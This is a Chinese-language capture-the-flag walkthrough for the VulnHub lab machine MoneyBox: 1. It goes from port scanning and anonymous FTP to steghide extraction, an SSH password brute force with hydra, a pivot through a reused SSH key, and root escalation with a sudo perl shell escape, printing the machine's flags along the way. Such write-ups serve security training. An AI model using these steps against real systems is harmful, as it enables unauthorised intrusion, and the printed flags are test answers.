# MoneyBox: 1

2024-5-24 https://www.vulnhub.com/entry/moneybox-1,653/

difficulty: Easy

## IP

192.168.5.29

## Scan

Open Port -> 21,22,80

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.5.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 1e30ce7281e0a23d5c28888b12acfaac (RSA)
|   256 019dfafbf20637c012fc018b248f53ae (ECDSA)
|_  256 2f34b3d074b47f8d17d237b12e32f7eb (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MoneyBox
```

ftp 21 端口可以匿名登陆，登陆后发现一张图片，下载到 kali 上进行查看，是一个猫图，binwalk 和 strings 没查出特殊的信息。

看 80 web 服务，首页是个提示信息，使用 gobuster 进行扫描：

```
http://192.168.5.29/blogs
```

源代码中发下提示：

```
<!--the hint is the another secret directory is S3cr3t-T3xt-->
```

访问这个提示的目录 http://192.168.5.29/S3cr3t-T3xt/ 继续查看源代码：

```
<!..Secret Key 3xtr4ctd4t4 >
```

显示了一个密码，尝试后，不是路径，能不能是上面图片中的隐写密码，使用 steghide 进行解密：

```
steghide info trytofind.jpg

"trytofind.jpg":
  format: jpeg
  capacity: 64.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file "data.txt":
    size: 136.0 Byte
    encrypted: no
    compressed: no

```

发现有嵌入文件 data.txt，进行解压：

```
steghide extract -sf trytofind.jpg

Enter passphrase:
wrote extracted data to "data.txt".
```

data.txt 中的内容：

```
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

提到一个用户 renu , 说密码为弱密码，使用 hydra + rockyou 进行尝试爆破，找到密码:987654321

ssh 进行登陆，找到了第一个 flag：

```
renu@MoneyBox:~$ cat user1.txt
Yes...!
You Got it User1 Flag

 ==> us3r1{F14g:0ku74tbd3777y4}
```

查看 .bash_history 发现 renu 把 ssh 密钥拷贝到 lily 账户下：

```
renu@MoneyBox:~$ cat .bash_history

ssh-copy-id lily@192.168.43.80
```

尝试登陆到 lily：

```
ssh lily@127.0.0.1
```

登陆后，发现了第 2 个 flag：

```
lily@MoneyBox:~$ cat user2.txt
Yeah.....
You Got a User2 Flag

==> us3r{F14g:tr5827r5wu6nklao}
```

查看 lily 的 sudo 权限，发现：

```
(ALL : ALL) NOPASSWD: /usr/bin/perl
```

可以直接提权到 root：

```
sudo perl -e 'exec "/bin/sh";'

# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
# ls -al
total 28
drwx------  3 root root 4096 Feb 26  2021 .
drwxr-xr-x 18 root root 4096 Feb 25  2021 ..
-rw-------  1 root root 2097 Feb 26  2021 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Feb 25  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  228 Feb 26  2021 .root.txt
# cat .root.txt

Congratulations.......!

You Successfully completed MoneyBox

Finally The Root Flag
    ==> r00t{H4ckth3p14n3t}

I'm Kirthik-KarvendhanT
    It's My First CTF Box

instagram : ____kirthik____

See You Back....
```
